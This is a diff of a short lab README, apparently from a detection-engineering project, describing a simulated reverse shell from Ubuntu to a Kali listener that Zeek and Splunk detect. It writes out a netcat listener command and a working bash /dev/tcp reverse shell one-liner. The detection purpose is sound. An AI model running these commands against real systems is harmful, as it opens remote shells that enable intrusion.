@@ -1,13 +1,14 @@
 # Reverse Shell Detection
+Detects a network connection where a compromised system initiates a connection back to an attacker-controlled machine and provides a command shell.
 
-A reverse shell was simulated between Ubuntu and Kali.
+Test performed: Kali opened a listener on TCP port 4444, and Ubuntu initiated a reverse shell connection back to Kali. Zeek conn.log captured the connection and the event was detected in Splunk.
 
-##Kali listener: 
+## Kali listener: 
 ```bash
 
 nc -lvnp 4444
 ```
-##Ubuntu test:
+## Ubuntu test:
 ```bash
 bash -i >& /dev/tcp/192.168.20.11/4444 0>&1
 ```
